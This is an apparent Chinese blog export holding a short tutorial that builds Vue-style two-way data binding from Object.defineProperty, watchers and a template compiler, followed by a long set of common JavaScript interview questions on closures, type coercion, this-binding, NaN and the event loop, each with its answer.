关于Object.defineProperty可在高程笔记-对象1有简单介绍，也可在MDN查看。 123456&lt;body&gt; &lt;input type="text" id="input" /&gt; &lt;div id="output"&gt;&lt;/div&gt; &lt;script src="app.js"&gt;&lt;/script&gt;&lt;/body&gt; 123456789101112131415/* app.js */var obj = &#123;&#125;Object.defineProperty(obj, "data", &#123; get: function () &#123; console.log("get") &#125;, set: function (newValue) &#123; console.log("set:"+newValue) document.getElementById("input").value = newValue document.getElementById("output").innerText = newValue &#125;&#125;)document.getElementById("input").addEventListener('keyup', function (event) &#123; obj.data = event.target.value&#125;) 简单实现实现双向绑定，需要实现 数据监听器Observer，能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知订阅者 指令解析器Compile，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数 Watcher，作为连接Observer和Compile的桥梁，能够订阅并收到每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图 入口函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138&lt;!DOCTYPE html&gt; &lt;head lang="en"&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;simple vue&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="app"&gt; &lt;input type="text" v-model="text"&gt; &#123;&#123;text&#125;&#125; &lt;/div&gt; &lt;script type="text/javascript"&gt; function Compile(node, vm) &#123; if(node) &#123; this.$frag = this.nodeToFragment(node, vm); return this.$frag; &#125; &#125; Compile.prototype = &#123; nodeToFragment: function(node, vm) &#123; var self = this; var frag = document.createDocumentFragment(); var child; while(child = node.firstChild) &#123; self.compileElement(child, vm); frag.append(child); // 将所有子节点添加到fragment中 &#125; return frag; &#125;, compileElement: function(node, vm) &#123; var reg = /\&#123;\&#123;(.*)\&#125;\&#125;/; //节点类型为元素 if(node.nodeType === 1) &#123; var attr = node.attributes; // 解析属性 for(var i = 0; i &lt; attr.length; i++ ) &#123; if(attr[i].nodeName == 'v-model') &#123; var name = attr[i].nodeValue; // 获取v-model绑定的属性名 node.addEventListener('input', function(e) &#123; // 给相应的data属性赋值，进而触发该属性的set方法 vm[name]= e.target.value; &#125;); // node.value = vm[name]; // 将data的值赋给该node new Watcher(vm, node, name, 'value'); &#125; &#125;; &#125; //节点类型为text if(node.nodeType === 3) &#123; if(reg.test(node.nodeValue)) &#123; var name = RegExp.$1; // 获取匹配到的字符串 name = name.trim(); // node.nodeValue = vm[name]; // 将data的值赋给该node new Watcher(vm, node, name, 'nodeValue'); &#125; &#125; &#125;, &#125; function Dep() &#123; this.subs = []; &#125; Dep.prototype = &#123; addSub: function(sub) &#123; this.subs.push(sub); &#125;, notify: function() &#123; this.subs.forEach(function(sub) &#123; sub.update(); &#125;) &#125; &#125; function Watcher(vm, node, name, type) &#123; Dep.target = this; this.name = name; this.node = node; this.vm = vm; this.type = type; this.update(); Dep.target = null; &#125; Watcher.prototype = &#123; update: function() &#123; this.get(); this.node[this.type] = this.value; // 订阅者执行相应操作 &#125;, // 获取data的属性值 get: function() &#123; this.value = this.vm[this.name]; //触发相应属性的get &#125; &#125; function defineReactive (obj, key, val) &#123; var dep = new Dep(); Object.defineProperty(obj, key, &#123; get: function() &#123; //添加订阅者watcher到主题对象Dep if(Dep.target) &#123; // JS的浏览器单线程特性，保证这个全局变量在同一时间内，只会有同一个监听器使用 dep.addSub(Dep.target); &#125; return val; &#125;, set: function (newVal) &#123; if(newVal === val) return; val = newVal; console.log(val); // 作为发布者发出通知 dep.notify(); &#125; &#125;) &#125; function observe(obj, vm) &#123; Object.keys(obj).forEach(function(key) &#123; defineReactive(vm, key, obj[key]); &#125;) &#125; function Vue(options) &#123; this.data = options.data; var data = this.data; observe(data, this); var id = options.el; var dom =new Compile(document.getElementById(id),this); // 编译完成后，将dom返回到app中 document.getElementById(id).appendChild(dom); &#125; var vm = new Vue(&#123; el: 'app', data: &#123; text: 'hello world' &#125; &#125;); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 参考链接http://www.html-js.com/article/Study-of-twoway-data-binding-JavaScript-talk-about-JavaScript-every-dayhttps://segmentfault.com/a/1190000006599500]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript基本面试问题和解答]]></title>
    <url>%2FJavaScript%E5%9F%BA%E6%9C%AC%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E5%92%8C%E8%A7%A3%E7%AD%94%2F</url>
    <content type="text"><![CDATA[有关于JavaScript的基本面试问题和解答。 使用typeof bar ===“object”来确定bar是否是一个对象时有什么潜在的缺陷？这个陷阱如何避免虽然typeof bar === “object” 是检查是否一种可靠的方法bar是一个对象，在JavaScript中令人惊讶的小问题，就是null在还考虑的对象！ 因此，对于大多数开发人员来说，下面的代码会将真实（而不是错误）记录到控制台： 12var bar = null;console.log(typeof bar === "object"); // logs true! 只要是意识到了这一点，这个问题可以很容易地通过检查也避免了如果bar是null： 1console.log((bar !== null) &amp;&amp; (typeof bar === "object")); // logs false 为了让答案更加完整，还有两件事值得注意： 首先，如果bar是一个函数，上面的解决方案将返回false。在大多数情况下，这是所期望的行为，但是在您希望函数返回true的情况下，您可以将上述解决方案修改为： 1console.log((bar !== null) &amp;&amp; ((typeof bar === "object") || (typeof bar === "function"))); 其次，如果bar是数组，则上述解决方案将返回true（例如，如果var bar = [];）。在大多数情况下，这是所需的行为，因为数组确实是对象，但是在需要false数组的情况下，可以将上述解决方案修改为： 1console.log((bar !== null) &amp;&amp; (typeof bar === "object") &amp;&amp; (toString.call(bar) !== "[object Array]")); 但是，还有一个替代方法对空值，数组和函数返回false，但对对象返回true： 1console.log((bar !== null) &amp;&amp; (bar.constructor === Object)); 或者，如果您使用jQuery： 1console.log((bar !== null) &amp;&amp; (typeof bar === "object") &amp;&amp; (! $.isArray(bar))); ES5使得数组的情况非常简单，包括它自己的空检查： 1console.log(Array.isArray(bar)); 下面的代码将输出到控制台的是什么，为什么123456(function()&#123; var a = b = 3;&#125;)();console.log("a defined? " + (typeof a !== 'undefined'));console.log("b defined? " + (typeof b !== 'undefined')); 由于a和b都在函数的封闭范围内定义，并且由于它们所在的行以var关键字开头，因此大多数JavaScript开发人员会希望typeof a和typeof b在上面的示例中都未定义。 但是，情况并非如此。这里的问题是大多数开发人员不正确地理解该语句var a = b = 3;简写为： 12var b = 3;var a = b; 但实际上，var a = b = 3;其实是速记： 12b = 3;var a = b; 因此（如果您不使用严格模式），代码片段的输出将为： 12a defined? falseb defined? true 但是如何在闭包范围外定义b呢？因为声明var a = b = 3;是语句b = 3的简写，同时var a = b;,故b最终成为了一个全局变量（因为它不在var关键字后面）。所以它还在作用域内，即使在封闭函数之外。 请注意，在严格模式下（即with use strict），该语句var a = b = 3;在运行时会报错ReferenceError: b is not defined，从而避免可能导致的任何headfakes/bugs。（作为的另一个主要例子，这就是你为什么在代码中应该理所当然的使用use strict！） 下面的代码在控制台将输出什么，为什么12345678910111213var myObject = &#123; foo: "bar", func: function() &#123; var self = this; console.log("outer func: this.foo = " + this.foo); console.log("outer func: self.foo = " + self.foo); (function() &#123; console.log("inner func: this.foo = " + this.foo); console.log("inner func: self.foo = " + self.foo); &#125;()); &#125;&#125;;myObject.func(); 以上代码将输出到控制台： 1234outer func: this.foo = barouter func: self.foo = barinner func: this.foo = undefinedinner func: self.foo = bar 在外部函数，这两个this和self参考myObject，因此两者都可以正确地引用和访问foo。 然而，在内部函数中，this不能再访问myObject。因此，this.foo在内部函数中未定义，而对局部变量的引用self保持在范围内并且可以在那里访问。 在功能块中封装JavaScript源文件的全部内容的重要性和原因是什么这是一种日益普遍的做法，被许多流行的JavaScript库（jQuery，Node.js等）所采用。这种技术在文件的全部内容周围创建一个闭包，这可能最重要的是创建一个私有名称空间，从而有助于避免不同JavaScript模块和库之间的潜在名称冲突。 这种技术的另一个特点是为全局变量提供一个容易引用（可能更短）的别名。例如，这通常用于jQuery插件。jQuery允许您使用禁用$对jQuery名称空间的引用jQuery.noConflict()。如果这样做了，你的代码仍然可以$使用这种闭包技术，如下所示： 1(function($) &#123; /* jQuery plugin code referencing $ */ &#125; )(jQuery); 在JavaScript源文件的开始部分包含’use strict’有什么意义以及好处最简单也是最重要的答案是，use strict是一种在运行时自动执行更严格的JavaScript代码解析和错误处理的方法。如果代码错误被忽略或失败，将会产生错误或抛出异常。总的来说，这是一个很好的做法。 严格模式的一些主要优点包括： 使调试更容易。如果代码错误本来会被忽略或失败，那么现在将会产生错误或抛出异常，从而更快地发现代码中的问题，并更快地指引它们的源代码。 防止意外全局。如果没有严格模式，将值赋给未声明的变量会自动创建一个具有该名称的全局变量。这是JavaScript中最常见的错误之一。在严格模式下，尝试这样做会抛出错误。 消除this的威胁。在没有严格模式的情况下，this对空值或未定义值的引用会自动强制到全局。这可能会导致许多headfakes和pull-out-your-hair类型的错误。在严格模式下，引用thisnull或undefined的值会抛出错误。 不允许重复的参数值。 严格模式在检测到函数的重复命名参数（例如，function foo(val1, val2, val1){}）时会引发错误，从而捕获代码中几乎可以肯定存在的错误，否则可能会浪费大量时间追踪。 注意：它曾经是（在ECMAScript 5中）严格模式将不允许重复的属性名称（例如var object = {foo: “bar”, foo: “baz”};），但从ECMAScript 2015开始不再是这种情况。 使eval（）更安全。eval()在严格模式和非严格模式下，表现 方式存在一些差异。最重要的是，在严格模式下，声明eval()内部声明的变量和函数不会在包含范围中创建（它们是以非严格模式在包含范围中创建的，这也可能是问题的常见来源）。 抛出错误或无效使用的delete。 delete操作符（用于从对象中删除属性）不能在对象的非配置属性上来使用。当试图删除一个不可配置的属性时，非严格代码将自动失败，而在这种情况下，严格模式会引发错误。 思考下面的两个函数。他们都会返回相同的值吗？为什么1234567891011121314function foo1()&#123; return &#123; bar: "hello" &#125;;&#125;function foo2()&#123; return &#123; bar: "hello" &#125;;&#125; 令人惊讶的是，这两个函数不会返回相同的结果。而是 1234console.log("foo1 returns:");//foo1 returns:console.log(foo1());//Object &#123;bar: "hello"&#125;console.log("foo2 returns:");//foo2 returns:console.log(foo2());//undefined 这不仅令人惊讶，而且特别令人烦恼的是foo2()返回未定义而没有引发任何错误。 原因与JavaScript中分号在技术上是可选的事实有关（尽管忽略它们通常是非常糟糕的形式）。因此，在foo2（）中遇到包含return语句的行（没有其他内容）时，会在return语句之后立即自动插入分号。 由于代码的其余部分是完全有效的，即使它没有被调用或做任何事情（它只是一个未使用的代码块，它定义了一个属性栏，它等于字符串“hello”），所以不会抛出任何错误。 这种行为也被认为是遵循了在JavaScript中将一行开头大括号放在行尾的约定，而不是在新行的开头。如此处所示，这不仅仅是JavaScript中的一种风格偏好。 什么是NaN？它的类型是什么？如何可靠地测试一个值是否等于NaNNaN属性表示“不是数字”的值。这个特殊值是由于一个操作数是非数字的（例如“abc”/ 4）或者因为操作的结果是非数字而无法执行的。 虽然这看起来很简单，但NaN有一些令人惊讶的特征，如果人们没有意识到这些特征，就会导致bug。 一方面，虽然NaN的意思是“不是数字”，但它的类型是，数字： 1console.log(typeof NaN === "number"); // logs "true" 此外，NaN相比任何事情 - 甚至本身！ - 是false： 1console.log(NaN === NaN); // logs "false" 测试数字是否等于NaN的半可靠方法是使用内置函数isNaN（），但即使使用isNaN（）也不是一个好的解决方案。. 一个更好的解决方案要么是使用value！==值，如果该值等于NaN，那么只会生成true。另外，ES6提供了一个新的Number.isNaN（）函数 ，它与旧的全局isNaN（）函数不同，也更加可靠。 下面的代码输出什么？解释你的答案12console.log(0.1 + 0.2);console.log(0.1 + 0.2 == 0.3); 对这个问题的一个有教养的回答是：“你不能确定。它可能打印出0.3和true，或者可能不打印。 JavaScript中的数字全部用浮点精度处理，因此可能不会总是产生预期的结果。“ 上面提供的示例是演示此问题的经典案例。令人惊讶的是，它会打印出来： 120.30000000000000004false 一个典型的解决方案是比较两个数字与特殊常数Number.EPSILON之间的绝对差值： 讨论写函数的可能方法isInteger（x），它确定x是否是一个整数。 这听起来很平凡，事实上，ECMAscript 6为此正好引入了一个新的Number.isInteger（）函数，这是微不足道的。但是，在ECMAScript 6之前，这有点复杂，因为没有提供与Number.isInteger（）方法等价的方法。 问题在于，在ECMAScript规范中，整数只在概念上存在;即数值始终作为浮点值存储。 考虑到这一点，最简单，最清洁的ECMAScript-6之前的解决方案（即使将非数字值（例如字符串或空值）传递给该函数，该解决方案也具有足够的可靠性以返回false）将成为以下用法按位异或运算符： 1function isInteger(x) &#123; return (x ^ 0) === x; &#125; 下面的解决方案也可以工作，尽管不如上面那样高雅 1function isInteger(x) &#123; return Math.round(x) === x; &#125; 请注意，在上面的实现中Math.ceil（）或Math.floor（）可以同样使用（而不是Math.round（））。 或者： 1function isInteger(x) &#123; return (typeof x === 'number') &amp;&amp; (x % 1 === 0); &#125; 一个相当常见的不正确的解决方案如下： 1function isInteger(x) &#123; return parseInt(x, 10) === x; &#125; 虽然这个基于parseInt的方法对许多x值很有效，但一旦x变得相当大，它将无法正常工作。问题是parseInt（）在解析数字之前将其第一个参数强制转换为字符串。因此，一旦数字变得足够大，其字符串表示将以指数形式呈现（例如1e + 21）。因此，parseInt（）将尝试解析1e + 21，但是当它到达e字符时将停止解析，因此将返回值1.观察： 12345678&gt; String(1000000000000000000000)'1e+21'&gt; parseInt(1000000000000000000000, 10)1&gt; parseInt(1000000000000000000000, 10) === 1000000000000000000000false 执行下面的代码时，按什么顺序将数字1-4记录到控制台？为什么123456(function() &#123; console.log(1); setTimeout(function()&#123;console.log(2)&#125;, 1000); setTimeout(function()&#123;console.log(3)&#125;, 0); console.log(4);&#125;)(); 这些值将按以下顺序记录： 12341432 我们先来解释一下这些可能更为明显的部分： 首先显示1和4，因为它们是通过简单调用console.log（）而没有任何延迟记录的 在3之后显示，因为在延迟1000毫秒（即1秒）之后记录2，而在0毫秒的延迟之后记录3。 好的。但是，如果在延迟0毫秒后记录3，这是否意味着它正在被立即记录？而且，如果是这样，不应该在4之前记录它，因为4是由后面的代码行记录的吗？ 答案与正确理解JavaScript事件和时间有关。 浏览器有一个事件循环，它检查事件队列并处理未决事件。例如，如果在浏览器繁忙时（例如，处理onclick）在后台发生事件（例如脚本onload事件），则该事件被附加到队列中。当onclick处理程序完成时，将检查队列并处理该事件（例如，执行onload脚本）。 同样，如果浏览器繁忙，setTimeout（）也会将其引用函数的执行放入事件队列中。 当值为零作为setTimeout（）的第二个参数传递时，它将尝试“尽快”执行指定的函数。具体来说，函数的执行放置在事件队列中，以在下一个计时器滴答时发生。但请注意，这不是直接的;该功能不会执行，直到下一个滴答声。这就是为什么在上面的例子中，调用console.log（4）发生在调用console.log（3）之前（因为调用console.log（3）是通过setTimeout调用的，所以稍微延迟了一点）。 编写一个简单的函数（少于160个字符），返回一个布尔值，指示字符串是否是palindrome如果str是回文，以下一行函数将返回true;否则，它返回false。 1234function isPalindrome(str) &#123; str = str.replace(/\W/g, '').toLowerCase(); return (str == str.split('').reverse().join(''));&#125; 例如： 123console.log(isPalindrome("level")); // logs 'true'console.log(isPalindrome("levels")); // logs 'false'console.log(isPalindrome("A car, a man, a maraca")); // logs 'true' 写一个sum方法，当使用下面的语法调用时它将正常工作12console.log(sum(2,3)); // Outputs 5console.log(sum(2)(3)); // Outputs 5 有（至少）两种方法可以做到这一点： METHOD 1 1234567function sum(x) &#123; if (arguments.length == 2) &#123; return arguments[0] + arguments[1]; &#125; else &#123; return function(y) &#123; return x + y; &#125;; &#125;&#125; 在JavaScript中，函数提供对参数对象的访问，该对象提供对传递给函数的实际参数的访问。这使我们能够使用length属性在运行时确定传递给函数的参数的数量 如果传递两个参数，我们只需将它们相加并返回。 否则，我们假设它是以sum（2）（3）的形式被调用的，所以我们返回一个匿名函数，它将传递给sum（）（在本例中为2）的参数和传递给匿名函数的参数这种情况3）。 METHOD 2 1234567function sum(x, y) &#123; if (y !== undefined) &#123; return x + y; &#125; else &#123; return function(y) &#123; return x + y; &#125;; &#125;&#125; 当函数被调用时，JavaScript不需要参数的数量来匹配函数定义中参数的数量。如果传递的参数数量超过了函数定义中参数的数量，则超出的参数将被忽略。另一方面，如果传递的参数数量少于函数定义中的参数数量，则在函数内引用时，缺少的参数将具有未定义的值。因此，在上面的例子中，通过简单地检查第二个参数是否未定义，我们可以确定函数被调用的方式并相应地继续。 考虑下面的代码片段123456for (var i = 0; i &lt; 5; i++) &#123; var btn = document.createElement('button'); btn.appendChild(document.createTextNode('Button ' + i)); btn.addEventListener('click', function()&#123; console.log(i); &#125;); document.body.appendChild(btn);&#125; (a) 当用户点击“按钮4”时，什么被记录到控制台？为什么？ (b) 提供一个或多个可按预期工作的替代实现。 答： (a) 无论用户点击哪个按钮，数字5将始终记录到控制台。这是因为，在调用onclick方法（对于任何按钮）时，for循环已经完成，并且变量i已经具有值5.（如果受访者知道足够的话就可以获得奖励点数关于执行上下文，变量对象，激活对象和内部“范围”属性如何影响闭包行为。） (b) 使这项工作的关键是通过将它传递给新创建的函数对象来捕获每次通过for循环的i的值。以下是四种可能的方法来实现这一点： 12345678for (var i = 0; i &lt; 5; i++) &#123; var btn = document.createElement('button'); btn.appendChild(document.createTextNode('Button ' + i)); btn.addEventListener('click', (function(i) &#123; return function() &#123; console.log(i); &#125;; &#125;)(i)); document.body.appendChild(btn);&#125; 或者，您可以将新的匿名函数中的整个调用包装为btn.addEventListener： 12345678for (var i = 0; i &lt; 5; i++) &#123; var btn = document.createElement('button'); btn.appendChild(document.createTextNode('Button ' + i)); (function (i) &#123; btn.addEventListener('click', function() &#123; console.log(i); &#125;); &#125;)(i); document.body.appendChild(btn);&#125; 或者，我们可以通过调用数组对象的原生forEach方法来替换for循环： 123456['a', 'b', 'c', 'd', 'e'].forEach(function (value, i) &#123; var btn = document.createElement('button'); btn.appendChild(document.createTextNode('Button ' + i)); btn.addEventListener('click', function() &#123; console.log(i); &#125;); document.body.appendChild(btn);&#125;); 最后，最简单的解决方案，如果你在ES6 / ES2015上下文中，就是使用let i而不是var i： 123456for (let i = 0; i &lt; 5; i++) &#123; var btn = document.createElement('button'); btn.appendChild(document.createTextNode('Button ' + i)); btn.addEventListener('click', function()&#123; console.log(i); &#125;); document.body.appendChild(btn);&#125; 假设d是范围内的“空”对象1var d = &#123;&#125;; 使用下面的代码完成了什么？使用下面的代码完成了什么？ 123[ 'zebra', 'horse' ].forEach(function(k) &#123; d[k] = undefined;&#125;); 上面显示的代码片段在对象d上设置了两个属性。理想情况下，对具有未设置键的JavaScript对象执行的查找评估为未定义。但是运行这段代码会将这些属性标记为对象的“自己的属性”。 这是确保对象具有一组给定属性的有用策略。将该对象传递给Object.keys将返回一个包含这些设置键的数组（即使它们的值未定义）。 下面的代码将输出到控制台，为什么123456var arr1 = "john".split('');var arr2 = arr1.reverse();var arr3 = "jones".split('');arr2.push(arr3);console.log("array 1: length=" + arr1.length + " last=" + arr1.slice(-1));console.log("array 2: length=" + arr2.length + " last=" + arr2.slice(-1)); 记录的输出将是： 12"array 1: length=5 last=j,o,n,e,s""array 2: length=5 last=j,o,n,e,s" arr1和arr2是相同的（即[‘n’，’h’，’o’，’j’，[‘j’，’o’，’n’，’e’，’s’]]）上述代码由于以下原因而被执行： 调用数组对象的reverse（）方法不仅以相反的顺序返回数组，它还颠倒了数组本身的顺序（即在这种情况下，arr1）。 reverse（）方法返回对数组本身的引用（即，在这种情况下为arr1）。因此，arr2仅仅是对arr1的引用（而不是副本）。因此，当对arr2做任何事情时（即，当我们调用arr2.push（arr3）;）时，arr1也会受到影响，因为arr1和arr2只是对同一个对象的引用。 这里有几个观点可以让人们回答这个问题： 将数组传递给另一个数组的push（）方法会将整个数组作为单个元素推入数组的末尾。结果，声明arr2.push（arr3）;将arr3作为一个整体添加到arr2的末尾（即，它不连接两个数组，这就是concat（）方法的用途）。 像Python一样，JavaScript在调用像slice（）这样的数组方法时，会承认负面下标，以此作为在数组末尾引用元素的方式;例如，下标-1表示数组中的最后一个元素，依此类推。 下面的代码输出到控制台，为什么123456console.log(1 + "2" + "2");console.log(1 + +"2" + "2");console.log(1 + -"1" + "2");console.log(+"1" + "1" + "2");console.log( "A" - "B" + "2");console.log( "A" - "B" + 2); 以上代码将输出到控制台： “122”“32”“02”“112”“NaN2”NaN 这是为什么… 这里的基本问题是JavaScript（ECMAScript）是一种松散类型的语言，它对值执行自动类型转换以适应正在执行的操作。让我们来看看这是如何与上面的每个例子进行比较。 示例1：1 +“2”+“2”输出：“122”说明：第一个操作在1 +“2”中执行。由于其中一个操作数（“2”）是一个字符串，所以JavaScript假定需要执行字符串连接，因此将1的类型转换为“1”，1 +“2”转换为“12”。然后，“12”+“2”产生“122”。 示例2：1 + +“2”+“2”输出：“32”说明：根据操作顺序，要执行的第一个操作是+“2”（第一个“2”之前的额外+被视为一个一元运算符）。因此，JavaScript将“2”的类型转换为数字，然后将一元+符号应用于它（即将其视为正数）。结果，下一个操作现在是1 + 2，当然这会产生3.但是，我们有一个数字和一个字符串之间的操作（即3和“2”），所以JavaScript再次转换数值赋给一个字符串并执行字符串连接，产生“32”。 示例3：1 + - “1”+“2”输出：“02”说明：这里的解释与前面的示例相同，只是一元运算符是 - 而不是+。因此，“1”变为1，然后在应用 - 时将其变为-1，然后将其加1到产生0，然后转换为字符串并与最终的“2”操作数连接，产生“02”。 示例4：+“1”+“1”+“2”输出：“112”说明：尽管第一个“1”操作数是基于其前面的一元+运算符的数值类型转换的，当它与第二个“1”操作数连接在一起时返回一个字符串，然后与最终的“2”操作数连接，产生字符串“112”。 示例5：“A” - “B”+“2”输出：“NaN2”说明：由于 - 运算符不能应用于字符串，并且既不能将“A”也不能将“B”转换为数值， “ - ”B“产生NaN，然后​​与字符串”2“串联产生”NaN2“。 例6：“A” - “B”+2输出：NaN说明：在前面的例子中，“A” - “B”产生NaN。但是任何运算符应用于NaN和其他数字操作数仍然会产生NaN。 如果数组列表太大，以下递归代码将导致堆栈溢出。你如何解决这个问题，仍然保留递归模式12345678910var list = readHugeList();var nextListItem = function() &#123; var item = list.pop(); if (item) &#123; // process the list item... nextListItem(); &#125;&#125;; 通过修改nextListItem函数可以避免潜在的堆栈溢出，如下所示： 12345678910var list = readHugeList();var nextListItem = function() &#123; var item = list.pop(); if (item) &#123; // process the list item... setTimeout( nextListItem, 0); &#125;&#125;; 堆栈溢出被消除，因为事件循环处理递归，而不是调用堆栈。当nextListItem运行时，如果item不为null，则将超时函数（nextListItem）推送到事件队列，并且函数退出，从而使调用堆栈清零。当事件队列运行超时事件时，将处理下一个项目，并设置一个计时器以再次调用nextListItem。因此，该方法从头到尾不经过直接递归调用即可处理，因此调用堆栈保持清晰，无论迭代次数如何。 什么是JavaScript中的“闭包”？举一个例子闭包是一个内部函数，它可以访问外部（封闭）函数的作用域链中的变量。闭包可以访问三个范围内的变量;具体来说：（1）变量在其自己的范围内，（2）封闭函数范围内的变量，以及（3）全局变量。 这里是一个例子： 1234567891011121314151617var globalVar = "xyz";(function outerFunc(outerArg) &#123; var outerVar = 'a'; (function innerFunc(innerArg) &#123; var innerVar = 'b'; console.log( "outerArg = " + outerArg + "\n" + "innerArg = " + innerArg + "\n" + "outerVar = " + outerVar + "\n" + "innerVar = " + innerVar + "\n" + "globalVar = " + globalVar); &#125;)(456);&#125;)(123); 在上面的例子中，innerFunc，outerFunc和全局名称空间的变量都在innerFunc的范围内。上面的代码将产生以下输出： 12345outerArg = 123innerArg = 456outerVar = ainnerVar = bglobalVar = xyz 以下代码的输出是什么123for (var i = 0; i &lt; 5; i++) &#123; setTimeout(function() &#123; console.log(i); &#125;, i * 1000 );&#125; 解释你的答案。如何在这里使用闭包？ 显示的代码示例不会显示值0,1,2,3和4，这可能是预期的;而是显示5,5,5,5。 这是因为循环内执行的每个函数将在整个循环完成后执行，因此所有函数都会引用存储在i中的最后一个值，即5。 通过为每次迭代创建一个唯一的作用域 ，可以使用闭包来防止这个问题，并将该变量的每个唯一值存储在其作用域中，如下所示： 12345for (var i = 0; i &lt; 5; i++) &#123; (function(x) &#123; setTimeout(function() &#123; console.log(x); &#125;, x * 1000 ); &#125;)(i);&#125; 这会产生将0,1,2,3和4记录到控制台的可能结果。 在ES2015上下文中，您可以在原始代码中简单地使用let而不是var： 123for (let i = 0; i &lt; 5; i++) &#123; setTimeout(function() &#123; console.log(i); &#125;, i * 1000 );&#125; 以下几行代码输出到控制台1234console.log("0 || 1 = "+(0 || 1));console.log("1 || 2 = "+(1 || 2));console.log("0 &amp;&amp; 1 = "+(0 &amp;&amp; 1));console.log("1 &amp;&amp; 2 = "+(1 &amp;&amp; 2)); 解释你的答案。 该代码将输出以下四行： 12340 || 1 = 11 || 2 = 10 &amp;&amp; 1 = 01 &amp;&amp; 2 = 2 在JavaScript中，都是||和&amp;&amp;是逻辑运算符，当从左向右计算时返回第一个完全确定的“逻辑值”。 或（||）运算符。在形式为X || Y的表达式中，首先计算X并将其解释为布尔值。如果此布尔值为真，则返回true（1），并且不计算Y，因为“或”条件已经满足。但是，如果此布尔值为“假”，我们仍然不知道X || Y是真还是假，直到我们评估Y，并将其解释为布尔值。 因此，0 || 1评估为真（1），正如1 || 2。 和（&amp;&amp;）运算符。在X &amp;&amp; Y形式的表达式中，首先评估X并将其解释为布尔值。如果此布尔值为false，则返回false（0）并且不评估Y，因为“and”条件已失败。但是，如果这个布尔值为“真”，我们仍然不知道X &amp;&amp; Y是真还是假，直到我们评估Y，并将其解释为布尔值。 然而，&amp;&amp;运算符的有趣之处在于，当表达式评估为“真”时，则返回表达式本身。这很好，因为它在逻辑表达式中被视为“真”，但也可以用于在您关心时返回该值。这解释了为什么，有点令人惊讶的是，1 &amp;&amp; 2返回2（而你可能会期望它返回true或1）。 下面的代码执行时输出是什么？说明12console.log(false == '0')console.log(false === '0') 该代码将输出： 12truefalse 在JavaScript中，有两套相等运算符。三重相等运算符===的行为与任何传统的相等运算符相同：如果两侧的两个表达式具有相同的类型和相同的值，则计算结果为true。然而，双等号运算符在比较它们之前试图强制这些值。因此，通常使用===而不是==。对于！== vs！=也是如此。 以下代码的输出是什么？解释你的答案12345678var a=&#123;&#125;, b=&#123;key:'b'&#125;, c=&#123;key:'c'&#125;;a[b]=123;a[c]=456;console.log(a[b]); 此代码的输出将是456（不是123）。 原因如下：设置对象属性时，JavaScript会隐式地将参数值串联起来。在这种情况下，由于b和c都是对象，它们都将被转换为“[object Object]”。因此，a [b]和a [c]都等价于[“[object Object]”]，并且可以互换使用。因此，设置或引用[c]与设置或引用[b]完全相同。 以下代码将输出到控制台中1console.log((function f(n)&#123;return ((n &gt; 1) ? n * f(n-1) : n)&#125;)(10)); 该代码将输出10阶乘的值（即10！或3,628,800）。 原因如下： 命名函数f（）以递归方式调用自身，直到它调用f（1），它简单地返回1.因此，这就是它的作用： 12345678910f(1): returns n, which is 1f(2): returns 2 * f(1), which is 2f(3): returns 3 * f(2), which is 6f(4): returns 4 * f(3), which is 24f(5): returns 5 * f(4), which is 120f(6): returns 6 * f(5), which is 720f(7): returns 7 * f(6), which is 5040f(8): returns 8 * f(7), which is 40320f(9): returns 9 * f(8), which is 362880f(10): returns 10 * f(9), which is 3628800 考虑下面的代码片段。控制台的输出是什么，为什么12345(function(x) &#123; return (function(y) &#123; console.log(x); &#125;)(2)&#125;)(1); 输出将为1，即使x的值从未在内部函数中设置。原因如下： 正如我们的JavaScript招聘指南中所解释的，闭包是一个函数，以及创建闭包时在范围内的所有变量或函数。在JavaScript中，闭包被实现为“内部函数”;即在另一功能的主体内定义的功能。闭包的一个重要特征是内部函数仍然可以访问外部函数的变量。 因此，在这个例子中，因为x没有在内部函数中定义，所以在外部函数的作用域中搜索一个定义的变量x，该变量的值为1。 以下代码将输出到控制台以及为什么1234567891011var hero = &#123; _name: 'John Doe', getSecretIdentity: function ()&#123; return this._name; &#125;&#125;;var stoleSecretIdentity = hero.getSecretIdentity;console.log(stoleSecretIdentity());console.log(hero.getSecretIdentity()); 这段代码有什么问题，以及如何解决这个问题。 该代码将输出： 12undefinedJohn Doe 第一个console.log打印未定义，因为我们从hero对象中提取方法，所以stoleSecretIdentity（）在_name属性不存在的全局上下文（即窗口对象）中被调用。 修复stoleSecretIdentity（）函数的一种方法如下： 1var stoleSecretIdentity = hero.getSecretIdentity.bind(hero); 创建一个函数，给定页面上的DOM元素，将访问元素本身及其所有后代（不仅仅是它的直接子元素）。对于每个访问的元素，函数应该将该元素传递给提供的回调函数该函数的参数应该是： 一个 DOM 元素 一个回调函数（以DOM元素作为参数） 访问树中的所有元素（DOM）是[经典的深度优先搜索算法]Depth-First-Search algorithm应用程序。以下是一个示例解决方案： 1234567function Traverse(p_element,p_callback) &#123; p_callback(p_element); var list = p_element.children; for (var i = 0; i &lt; list.length; i++) &#123; Traverse(list[i],p_callback); // recursive call &#125;&#125; 在JavaScript中测试您的这些知识：以下代码的输出是什么1234567891011121314var length = 10;function fn() &#123; console.log(this.length);&#125;var obj = &#123; length: 5, method: function(fn) &#123; fn(); arguments[0](); &#125;&#125;;obj.method(fn, 1); 输出： 12102 为什么不是10和5？ 首先，由于fn作为函数方法的参数传递，函数fn的作用域（this）是窗口。 var length = 10;在窗口级别声明。它也可以作为window.length或length或this.length来访问（当这个===窗口时）。 方法绑定到Object obj，obj.method用参数fn和1调用。虽然方法只接受一个参数，但调用它时已经传递了两个参数;第一个是函数回调，其他只是一个数字。 当在内部方法中调用fn（）时，该函数在全局级别作为参数传递，this.length将有权访问在Object obj中定义的var length = 10（全局声明）而不是length = 5。 